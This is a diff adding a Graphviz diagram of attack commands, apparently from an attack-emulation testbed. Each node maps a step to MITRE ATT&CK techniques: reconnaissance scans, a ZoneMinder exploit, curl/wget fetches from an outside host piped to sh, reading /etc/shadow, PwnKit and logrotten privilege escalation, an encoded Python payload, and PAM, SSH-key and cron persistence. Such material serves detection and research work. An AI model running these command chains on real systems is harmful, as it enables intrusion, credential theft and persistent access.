@@ -1,0 +1,321 @@
+// Commands State Diagram
+digraph {
+	rankdir=TB
+	1 [label="1: dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com
+T1590.002: Gather Victim Network Information: DNS
+T1591: Gather Victim Org Information
+{'reconnaissance'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	2 [label="2: nmap__O__sT___top_ports_100_video_attackbed_com
+T1595: Active Scanning
+T1592.002: Gather Victim Host Information: Software
+{'reconnaissance'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	3 [label="3: nikto__host_video_attackbed_com
+T1595.002: Active Scanning: Vulnerability Scanning
+{'reconnaissance'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	4 [label="4: ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ
+T1595.003: Active Scanning: Wordlist Scanning
+{'reconnaissance'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	5 [label="5: exploit_unix_webapp_zoneminder_snapshots
+T1190: Exploit Public-Facing Application
+T1059.006: Command and Scripting Interpreter: Python
+{'initial-access', 'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	6 [label="6: upload__var_www_html_linpeas_sh
+T1105: Ingress Tool Transfer
+{'command-and-control'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	7 [label="7: python3__c__import_pty_pty_spawn___bash_____
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	8 [label="8: export_SHELL_bash
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	9 [label="9: export_TERM_xterm256_color
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	10 [label="10: stty_rows_38_columns_116
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	11 [label="11: export_PS1__PWN__
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	12 [label="12: chmod__x_linpeas_sh
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	13 [label="13: __linpeas_sh__s__q__N_2___dev_null
+T1087: Account Discovery
+T1083: File and Directory Discovery
+T1201: Password Policy Discovery
+T1069: Permission Groups Discovery
+T1057: Process Discovery
+T1518: Software Discovery
+T1082: System Information Discovery
+T1614: System Location Discovery
+T1016: System Network Configuration Discovery
+T1049: System Network Connections Discovery
+T1033: System Owner/User Discovery
+T1007: System Service Discovery
+T1615: Group Policy Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	14 [label="14: id
+T1033: System Owner/User Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	15 [label="15: ExecStartPre_bash__var_www_default__zm_preload_sh__
+T1547: Boot or Logon Autostart Execution
+{'persistence', 'privilege-escalation'}
+autostart_localaccount, autostart_pam, autostart_sshkey" shape=box style=rounded]
+	16 [label="16: _wq__
+T1547: Boot or Logon Autostart Execution
+{'persistence', 'privilege-escalation'}
+autostart_localaccount, autostart_pam, autostart_sshkey" shape=box style=rounded]
+	17 [label="17: python3__c__import_pty_pty_spawn___bash_____
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	18 [label="18: export_SHELL_bash
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	19 [label="19: export_TERM_xterm256_color
+T1059: Command and Scripting Interpreter
+{'execution'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	20 [label="20: id
+T1033: System Owner/User Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	21 [label="21: curl_http___192_42_1_174_README_txt_3___sh
+T1105: Ingress Tool Transfer
+T1136.001: Create Account: Local Account
+{'command-and-control', 'persistence'}
+autostart_localaccount, cron_localaccount, racecondition_localaccount" shape=box style=rounded]
+	22 [label="22: id
+T1033: System Owner/User Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	23 [label="23: id
+T1033: System Owner/User Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	24 [label="24: cat__etc_shadow
+T1003.008: OS Credential Dumping: /etc/passwd and /etc/shadow
+{'credential-access'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	25 [label="25: lspci
+T1120: Peripheral Device Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	26 [label="26: command__v_lsusb
+T1120: Peripheral Device Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	27 [label="27: date
+T1124: System Time Discovery
+{'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	28 [label="28: find__usr__name___virtualbox__
+T1497.001: Virtualization/Sandbox Evasion: System Checks
+{'defense-evasion', 'discovery'}
+autostart_localaccount, autostart_pam, autostart_sshkey, cron_localaccount, cron_pam, cron_sshkey, pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, racecondition_localaccount, racecondition_pam, racecondition_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	29 [label="29: curl_http___192_42_1_174_README_txt_5___sh
+T1105: Ingress Tool Transfer
+T1556.003: Modify Authentication Process: Pluggable Authentication Modules
+{'command-and-control', 'credential-access', 'persistence', 'defense-evasion'}
+autostart_pam, cron_pam, racecondition_pam" shape=box style=rounded]
+	30 [label="30: curl_http___192_42_1_174_README_txt_1___sh
+T1105: Ingress Tool Transfer
+T1098.004: Account Manipulation: SSH Authorized Keys
+{'command-and-control', 'persistence', 'privilege-escalation'}
+autostart_sshkey, cron_sshkey, racecondition_sshkey" shape=box style=rounded]
+	31 [label="31: curl_http___192_42_1_174_TODO_md___sh
+T1053: Scheduled Task/Job
+{'persistence', 'privilege-escalation', 'execution'}
+cron_localaccount, cron_pam, cron_sshkey" shape=box style=rounded]
+	32 [label="32: _wq__
+T1053: Scheduled Task/Job
+{'persistence', 'privilege-escalation', 'execution'}
+cron_localaccount, cron_pam, cron_sshkey" shape=box style=rounded]
+	33 [label="33: stty_rows_38_columns_116
+T1059: Command and Scripting Interpreter
+{'execution'}
+cron_localaccount, cron_pam, cron_sshkey" shape=box style=rounded]
+	34 [label="34: rm
+T1070.004: Indicator Removal: File Deletion
+{'defense-evasion'}
+cron_localaccount, cron_pam, cron_sshkey" shape=box style=rounded]
+	35 [label="35: wget_http___192_42_1_174_PwnKit____dev_null_2__1
+T1105: Ingress Tool Transfer
+{'command-and-control'}
+pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey" shape=box style=rounded]
+	36 [label="36: chmod__x_PwnKit______PwnKit
+T1068: Exploitation for Privilege Escalation
+{'privilege-escalation'}
+pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey" shape=box style=rounded]
+	37 [label="37: id
+T1033: System Owner/User Discovery
+{'discovery'}
+pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	38 [label="38: cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_2
+T1105: Ingress Tool Transfer
+T1136.001: Create Account: Local Account
+{'command-and-control', 'persistence'}
+pwnkit_localaccount, sudo_localaccount, validaccount_localaccount" shape=box style=rounded]
+	39 [label="39: split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt
+T1218: System Binary Proxy Execution
+T1136.001: Create Account: Local Account
+{'defense-evasion', 'persistence'}
+pwnkit_localaccount, sudo_localaccount, validaccount_localaccount" shape=box style=rounded]
+	40 [label="40: rm
+T1070.004: Indicator Removal: File Deletion
+{'defense-evasion'}
+pwnkit_localaccount, pwnkit_pam, pwnkit_sshkey, sudo_localaccount, sudo_pam, sudo_sshkey, validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	41 [label="41: cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_4
+T1105: Ingress Tool Transfer
+T1556.003: Modify Authentication Process: Pluggable Authentication Modules
+{'command-and-control', 'credential-access', 'persistence', 'defense-evasion'}
+pwnkit_pam, sudo_pam, validaccount_pam" shape=box style=rounded]
+	42 [label="42: split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt
+T1218: System Binary Proxy Execution
+T1556.003: Modify Authentication Process: Pluggable Authentication Modules
+{'defense-evasion', 'credential-access', 'persistence'}
+pwnkit_pam, sudo_pam, validaccount_pam" shape=box style=rounded]
+	43 [label="43: cd__root__wget_http___192_42_1_174_README_txt
+T1105: Ingress Tool Transfer
+T1098.004: Account Manipulation: SSH Authorized Keys
+{'command-and-control', 'persistence', 'privilege-escalation'}
+pwnkit_sshkey, sudo_sshkey, validaccount_sshkey" shape=box style=rounded]
+	44 [label="44: split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt
+T1218: System Binary Proxy Execution
+T1098.004: Account Manipulation: SSH Authorized Keys
+{'defense-evasion', 'persistence', 'privilege-escalation'}
+pwnkit_sshkey, sudo_sshkey, validaccount_sshkey" shape=box style=rounded]
+	45 [label="45: upload__var_www_html_logrotten
+T1105: Ingress Tool Transfer
+{'command-and-control'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	46 [label="46: chmod__x_logrotten
+T1059: Command and Scripting Interpreter
+{'execution'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	47 [label="47: cd__var_www_default
+T1546: Event Triggered Execution
+{'persistence', 'privilege-escalation'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	48 [label="48: echo__if_____id__u____eq_0____then_____echo_exec____import______zlib_____decompress____import______base64_____b64decode____import______codecs_____getencoder____utf_8________eNo9UE1LxDAQPTe_IrckGMO2xhUXK4h4EBHB3ZuItMmooWkakqxWxf9uQxbnMMObefPmw4x_CgnHSQ2Q_Lc1Pe_7CGvJYwp7lXgyI6DXKeAZG4dD596A1iu2QVUKX4uvYluaRQm04Qe8fbi_e9nuHm_u7lnmCTU5BypRSurzRshG1KI_k4SfLMYypQ_QDaiCWYFPWTsPF9ECeHrKkG3LTmLvfKcGSi5vCY8igPqgkrGn1TPS7QFbhj7fjQVswVHNLuwip4__q8clzRDMoGg_W2hQ0_gDxEjLB0S_ljmpITP5D4lkE38Z_gPO1l75______0___________exec___which_python____which_python3____which_python2______sh____fi____payload
+T1546: Event Triggered Execution
+{'persistence', 'privilege-escalation'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	49 [label="49: rm
+T1546: Event Triggered Execution
+{'persistence', 'privilege-escalation'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	50 [label="50: mkdir_log
+T1546: Event Triggered Execution
+{'persistence', 'privilege-escalation'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	51 [label="51: echo_empty___log_accesss_log
+T1546: Event Triggered Execution
+{'persistence', 'privilege-escalation'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	52 [label="52: _tmp_logrotten__p__var_www_default_payload__var_www_default_log_accesss_log
+T1546: Event Triggered Execution
+{'persistence', 'privilege-escalation'}
+racecondition_localaccount, racecondition_pam, racecondition_sshkey" shape=box style=rounded]
+	53 [label="53: dmesg__H
+T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+{'defense-evasion', 'privilege-escalation'}
+sudo_localaccount, sudo_pam, sudo_sshkey" shape=box style=rounded]
+	54 [label="54: _bash
+T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+{'defense-evasion', 'privilege-escalation'}
+sudo_localaccount, sudo_pam, sudo_sshkey" shape=box style=rounded]
+	55 [label="55: find__home__ls
+T1078.003: Valid Accounts: Local Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	56 [label="56: ssh__i__home_webdev__ssh_id_rsa__o__StrictHostKeyChecking_no__root_localhost
+T1078.003: Valid Accounts: Local Accounts
+{'initial-access', 'defense-evasion', 'persistence', 'privilege-escalation'}
+validaccount_localaccount, validaccount_pam, validaccount_sshkey" shape=box style=rounded]
+	48 -> 49
+	11 -> 12
+	5 -> 6
+	14 -> 31
+	1 -> 2
+	38 -> 39
+	19 -> 33
+	37 -> 38
+	56 -> 37
+	21 -> 22
+	26 -> 27
+	20 -> 21
+	29 -> 22
+	36 -> 37
+	54 -> 37
+	55 -> 56
+	50 -> 51
+	51 -> 52
+	41 -> 42
+	47 -> 48
+	44 -> 40
+	20 -> 29
+	31 -> 32
+	2 -> 3
+	32 -> 17
+	52 -> 17
+	13 -> 14
+	9 -> 10
+	8 -> 9
+	22 -> 34
+	14 -> 55
+	39 -> 40
+	14 -> 47
+	45 -> 6
+	17 -> 18
+	10 -> 11
+	3 -> 4
+	49 -> 50
+	27 -> 28
+	12 -> 13
+	25 -> 26
+	42 -> 40
+	37 -> 43
+	7 -> 8
+	20 -> 30
+	11 -> 46
+	4 -> 5
+	34 -> 23
+	53 -> 54
+	14 -> 35
+	16 -> 17
+	40 -> 23
+	33 -> 20
+	46 -> 12
+	23 -> 24
+	24 -> 25
+	22 -> 23
+	30 -> 22
+	19 -> 20
+	6 -> 7
+	37 -> 41
+	43 -> 44
+	15 -> 16
+	14 -> 15
+	40 -> 40
+	5 -> 45
+	18 -> 19
+	35 -> 36
+	14 -> 53
+}
